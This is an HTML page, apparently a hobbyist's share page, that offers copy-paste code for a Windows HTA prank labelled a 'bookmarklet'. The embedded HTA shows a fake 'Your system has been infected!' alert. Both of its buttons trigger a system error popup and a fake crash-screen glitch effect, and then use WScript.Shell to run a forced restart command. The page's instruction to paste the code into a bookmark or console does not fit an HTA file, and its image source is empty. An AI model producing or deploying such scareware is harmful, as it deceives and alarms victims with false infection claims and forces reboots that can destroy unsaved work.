<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>HTA Bookmarklet</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 20px;
    }
    textarea {
      width: 100%;
      height: 400px;
      font-family: monospace;
      background-color: #f9f9f9;
      border: 1px solid #ccc;
      padding: 10px;
      color: #333;
      box-sizing: border-box;
    }
    button {
      margin-top: 10px;
      padding: 10px 20px;
      background-color: #4CAF50;
      color: white;
      border: none;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
    }
    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>

  <h2>Overlay Bookmarklet</h2>
  <p>Copy and paste this into your bookmarks bar or console:made by leighton</p>

  <textarea id="scriptText" readonly>
  <html>
<head>
  <meta charset="UTF-8" />
  <title>Fake BSOD Fullscreen</title>
  <hta:application
    id="app"
    applicationname="FakeBSOD"
    border="none"
    caption="no"
    showintaskbar="no"
    sysmenu="no"
    maximizebutton="no"
    minimizebutton="no"
    scroll="no"
    singleinstance="yes"
    windowstate="normal"
  />
  <style>
    html, body {
      margin: 0; padding: 0; width: 100%; height: 100%;
      background: black; overflow: hidden; cursor: default;
      user-select: none; font-family: Consolas, monospace; color: white;
    }
    #container {
      display: flex; flex-direction: column;
      justify-content: center; align-items: center;
      height: 100vh; text-align: center; background: black;
      z-index: 1;
    }
    #container h1 { color: red; font-size: 3rem; margin-bottom: 20px; }
    #container p  { font-size: 1.5rem; margin-bottom: 40px; }
    #container button {
      font-size: 1.5rem; padding: 15px 40px; margin: 0 15px;
      border: none; border-radius: 8px;
      background: red; color: white; cursor: pointer;
      transition: background-color 0.3s ease;
    }
    #container button:hover { background: darkred; }
    #glitchImage, #fadeOverlay {
      position: fixed; top: 0; left: 0;
      width: 100vw; height: 100vh; object-fit: cover;
      z-index: 9999; opacity: 1;
      transition: filter 0.1s ease, transform 0.1s ease, opacity 3s ease;
    }
    #fadeOverlay {
      background: black; opacity: 0; pointer-events: none;
      transition: opacity 3s ease;
    }
  </style>
  <script>
    // Ensure HTA context
    try { new ActiveXObject("WScript.Shell"); }
    catch (e) { alert("Please run this as a .hta file."); window.close(); }

    function showErrorBox() {
      // Display native error dialog
      var shell = new ActiveXObject("WScript.Shell");
      shell.Popup("Fatal error — fix not possible", 0, "System Error", 0x10);
      launchFakeBSOD();
    }

    function launchFakeBSOD() {
      // Fullscreen window
      window.resizeTo(screen.width, screen.height);
      window.moveTo(0, 0);

      // Hide elements
      document.body.style.cursor = 'none';
      document.getElementById('container').style.display = 'none';

      // Add glitch image
      var img = document.createElement('img');
      img.id = 'glitchImage';
      img.src = 'data:image/png;base64,';
      document.body.appendChild(img);

      // Add overlay
      var fade = document.createElement('div'); fade.id = 'fadeOverlay';
      document.body.appendChild(fade);

      // Glitch effect
      var count=0, maxCount=60;
      var timer = setInterval(function() {
        count++;
        var b=0.7+Math.random()*0.6;
        var c=0.8+Math.random()*0.5;
        var h=Math.floor(Math.random()*360);
        var r=(Math.random()-0.5)*10;
        img.style.filter = 'brightness('+b+') contrast('+c+') hue-rotate('+h+'deg)';
        img.style.transform = 'rotate('+r+'deg)';
        if(count>=maxCount) { clearInterval(timer); fade.style.opacity='1'; img.style.opacity='0'; setTimeout(restartPC,3000); }
      },100);
    }

    function restartPC() {
      try {
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run('shutdown -r -t 5 -c "System encountered a fatal error and is restarting..."',0,false);
      } catch (e) { }
    }
  </script>
</head>
<body>
  <div id="container">
    <h1>⚠️ Security Alert!</h1>
    <p>Your system has been infected!<br>Fix?</p>
    <button onclick="showErrorBox()">Yes</button>
    <button onclick="showErrorBox()">No</button>
  </div>
</body>
</html>

  </textarea>

  <button onclick="copyToClipboard()">Copy to Clipboard</button>

  <script>
    function copyToClipboard() {
      const textarea = document.getElementById("scriptText");
      textarea.select();
      textarea.setSelectionRange(0, 99999); // For mobile support
      document.execCommand("copy");
      alert("Script copied to clipboard!");
    }
  </script>

</body>
</html>
